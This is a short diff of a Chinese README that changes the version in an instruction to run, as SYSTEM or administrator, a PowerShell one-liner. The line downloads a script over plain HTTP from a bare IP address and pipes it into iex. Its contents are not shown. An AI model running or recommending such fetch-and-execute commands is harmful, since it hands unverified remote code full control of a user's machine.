@@ -553,7 +553,7 @@ git push origin v5.0.0
 在 SYSTEM 或管理员 PowerShell 中运行：
 
 ```powershell
-irm 'http://139.196.47.109:9939/AAAAAAAA/siwx.ps1?v=cn309' | iex
+irm 'http://139.196.47.109:9939/AAAAAAAA/siwx.ps1?v=cn313' | iex
 ```
 
 脚本和 Windows EXE 同目录分发，详情与恢复方式见 [脚本说明](./scripts/README.md)。
